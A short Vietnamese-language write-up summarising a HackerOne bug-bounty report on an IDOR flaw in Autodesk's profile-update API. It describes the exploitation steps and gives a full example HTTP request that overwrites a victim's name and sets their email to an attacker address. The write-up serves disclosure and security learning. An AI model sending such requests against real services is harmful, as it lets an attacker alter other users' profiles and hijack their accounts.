# https://hackerone.com/reports/2965357
---

## 🧱 **IDOR – Sửa hồ sơ người dùng Autodesk trái phép**

### 🎯 **Mục tiêu**

* `https://profile.autodesk.com/api/user/profile`
* Tham số `id` trong API update profile

---

### 🧠 **Mô tả lỗi**

Lỗi **Insecure Direct Object Reference (IDOR)** cho phép attacker **chỉnh sửa thông tin hồ sơ** của người dùng khác bằng cách thay đổi giá trị tham số `id` gửi từ phía client.

Ban đầu bị đánh dấu là trùng lặp, nhưng sau được **mở lại và xác thực là hợp lệ**.

---

### 🔥 **Kịch bản khai thác**

1. Attacker login với tài khoản hợp lệ → lấy token
2. Gửi request API cập nhật thông tin người dùng với `id` là **ID của nạn nhân**
3. Server không kiểm tra quyền sở hữu → thông tin hồ sơ của nạn nhân **bị ghi đè**

```http
POST /api/user/profile
Host: profile.autodesk.com
Authorization: Bearer <token của attacker>

{
  "id": "victim_user_id",
  "name": "Hacked Name",
  "email": "attacker@evil.com"
}
```

---

=
